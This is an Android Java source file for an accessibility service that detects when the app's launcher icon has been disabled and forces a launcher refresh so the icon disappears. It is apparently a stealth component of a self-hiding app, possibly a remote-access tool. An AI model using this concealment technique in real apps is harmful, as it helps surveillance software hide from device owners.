package com.security.ravan;

import android.accessibilityservice.AccessibilityService;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;

public class LauncherRefreshService extends AccessibilityService {

    private static final String TAG = "LauncherRefreshService";
    private boolean hasRefreshed = false;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : null;
            if (!hasRefreshed && packageName != null && isAppHidden() && isLauncherPackage(packageName)) {
                Log.d(TAG, "Launcher detected after app hidden: " + packageName);
                refreshLauncher();
                hasRefreshed = true;
                stopSelf();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing accessibility event: " + e.getMessage(), e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "AccessibilityService interrupted");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "LauncherRefreshService created");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "LauncherRefreshService destroyed");
    }

    private String getLauncherPackageName() {
        try {
            Intent homeIntent = new Intent(Intent.ACTION_MAIN);
            homeIntent.addCategory(Intent.CATEGORY_HOME);
            PackageManager pm = getPackageManager();
            android.content.pm.ResolveInfo resolveInfo = pm.resolveActivity(homeIntent, PackageManager.MATCH_DEFAULT_ONLY);
            if (resolveInfo != null && resolveInfo.activityInfo != null) {
                return resolveInfo.activityInfo.packageName;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting launcher package: " + e.getMessage());
        }
        return null;
    }

    private boolean isLauncherPackage(String packageName) {
        if (packageName == null) {
            return false;
        }
        String launcherPackage = getLauncherPackageName();
        return launcherPackage != null && packageName.equals(launcherPackage);
    }

    private boolean isAppHidden() {
        try {
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            int state = getPackageManager().getComponentEnabledSetting(componentName);
            return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                    || state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER
                    || state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_UNTIL_USED;
        } catch (Exception e) {
            Log.e(TAG, "Error checking app hidden state: " + e.getMessage(), e);
            return false;
        }
    }

    private void refreshLauncher() {
        try {
            Log.d(TAG, "refreshLauncher(): sending HOME intent and performing global HOME action");
            Intent homeIntent = new Intent(Intent.ACTION_MAIN);
            homeIntent.addCategory(Intent.CATEGORY_HOME);
            homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
            startActivity(homeIntent);
            boolean globalHome = performGlobalAction(GLOBAL_ACTION_HOME);
            Log.d(TAG, "performGlobalAction(GLOBAL_ACTION_HOME) returned: " + globalHome);
        } catch (Exception e) {
            Log.e(TAG, "Error refreshing launcher: " + e.getMessage(), e);
        }
    }
}
